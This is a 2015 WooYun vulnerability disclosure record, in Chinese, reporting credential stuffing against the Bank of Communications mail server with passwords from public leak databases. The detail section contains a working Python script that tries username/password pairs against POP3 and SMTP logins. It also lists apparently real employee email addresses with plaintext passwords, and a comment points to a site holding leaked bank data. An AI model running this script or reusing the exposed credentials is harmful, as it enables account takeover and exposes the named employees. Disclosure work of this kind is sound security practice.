{"id": 37014, "wybug_id": "wooyun-2015-0106385", "wybug_title": "交通银行邮件服务器配置不当可直接撞库泄漏多人邮件账号密码", "wybug_corp": "交通银行", "wybug_author": "qq_hhl", "wybug_date": "2015-04-07 15:02", "wybug_open_date": "2015-05-25 17:52", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向公众公开  简要描述： 交通银行邮件服务器配置不当可直接撞库造成欺骗和内网渗透。 详细说明：  使用如下Python代码对交通银行邮件系统进行测试。配置使用如下公开泄漏数据库进行测试。   CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条。\n# coding=gb2312import poplibimport smtplibimport sysdef checksmtppassword(smtp_server,username,password):        try:                server = smtplib.SMTP(smtp_server, 25)                 #server.set_debuglevel(2)                       server.login(username, password)        except:                print '登录不成功'        else:                print '登录成功'def checkpop3password(pop3_server,username,password):        try:                server = poplib.POP3(pop3_server)                #server.set_debuglevel(2)                server.user(username)                server.pass_(password)        except Exception,e:                print '登录不成功'        else:                print '登录成功'        server.quit()                def open_check_password_user(file_path,server_ip,user_num,pass_num,mode):        mail_server=server_ip        f=open(file_path)        each_line=f.readline()        while each_line:                each_line=each_line.strip('\\n')                list = each_line.split()                  #print list[0]                password=list[ int(pass_num) ]                username=list[ int(user_num) ]                print list[ int(user_num) ]                print list[ int(pass_num) ]                if mode=='pop3' :                        checkpop3password(mail_server,username,password)                if mode=='smtp' :                        checksmtppassword(mail_server,username,password)                                                each_line=f.readline()                        if __name__ == '__main__':                print 'mail_check.py nefu.txt pop.nefu.edu.cn user_num pass_num mode'                print 'mail_check.py nefu.txt pop.nefu.edu.cn  2 1 pop3/smtp'                   open_check_password_user(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])\n   漏洞证明：   不一会就抛出了一些登录成功的结果。     截图。     登录邮箱成功截图。\n\n     敏感信息一堆一堆的\n\n     登录成功截图\n\n撞库涉及到的相关帐号g_ying@bankcomm.com \tying913299  fyp@bankcomm.com\tct198686   ...   修复方案：     我这么做会不会给你们添麻烦，通报银监会还不得处分你们。剩下的你们自己检测吧。   版权声明：转载请注明来源 qq_hhl@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-10 17:51 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给上海分中心，由上海分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-07 15:02 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  必杀    \n     2015-04-07 19:51 |    \t\tJotPot \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:10        | 小菜)\t\t \n  专搞银行？    \n     2015-05-05 10:46 |    \t\tqq_hhl \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        | 传统二进制安全卫道士。新兴web安全追随...)\t\t \n  www.tingmima.com  上面一坨一坨的银行信息    \n     2015-05-25 18:49 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  6666666    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}